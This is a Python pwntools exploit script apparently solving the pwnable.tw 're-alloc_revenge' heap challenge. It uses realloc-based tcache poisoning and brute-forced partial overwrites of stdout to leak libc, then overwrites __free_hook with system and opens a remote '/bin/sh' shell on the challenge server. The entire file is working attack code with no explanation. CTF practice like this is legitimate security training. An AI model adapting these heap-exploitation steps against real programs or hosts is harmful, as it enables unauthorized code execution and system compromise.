from contextlib2 import ContextDecorator
from pwn import *

elf = ELF("re-alloc_revenge")
libc = ELF('libc.so')
# context.log_level="debug"

def alloc(index, size, data):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'1')
    r.recvuntil(b'Index:')
    r.sendline(str(index).encode())
    r.recvuntil(b'Size:')
    r.sendline(str(size).encode())
    r.recvuntil(b'Data:')
    r.send(data)


def realloc(index, size, data):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'2')
    r.recvuntil(b'Index:')
    r.sendline(str(index).encode())
    r.recvuntil(b'Size:')
    r.sendline(str(size).encode())
    if size == 0:
        return
    r.recvuntil(b'Data:')
    r.send(data)


def free(index):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'3')
    r.recvuntil(b'Index:')
    r.sendline(str(index).encode())


while True:
    while True:
        r = remote('chall.pwnable.tw', 10310)

        alloc(0, 0x48, b'A')
        realloc(0, 0, b'')
        realloc(0, 0x48, p64(0) + p64(0))
        realloc(0, 0, b'')
        realloc(0, 0x48, b'\x10\x80')

        alloc(1, 0x48, b'A')
        realloc(1, 0x58, b'A')
        free(1)
        try:
            alloc(1, 0x48, b'\0' * 0x23 + b'\x07')
            realloc(1, 0, b'')
            message = r.recvline()
            if message == b'free(): invalid pointer\n':
                raise EOFError('Incorrect Guess')
            break
        except EOFError:
            r.close()

    realloc(1, 0x48, b'\x58\x87')
    realloc(0, 0x38, p64(0) + p64(0))
    free(0)
    alloc(0, 0x48, b'A')
    realloc(0, 0x38, b'A')
    free(0)
    try:

        alloc(0, 0x40, b'/bin/sh\0' + p64(0xfbad1800) + p64(0) * 3)
        leak = r.recvline()
        if leak.startswith(b'$$$$$$$$$$$$$$$$$$$$$$$$$$$$'):
            raise EOFError('Incorrect Guess')
        break
    except EOFError:
        r.close()

libc_leak = u64(leak[8:16])
log.info(f"libc_leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x1e7570
log.success(f"libc_base: {hex(libc.address)}")

realloc(1, 0x48, p64(0) * 8 + p64(libc.sym['__free_hook']))
free(1)
alloc(1, 0x18, p64(libc.sym['system']))

free(0)

r.interactive()
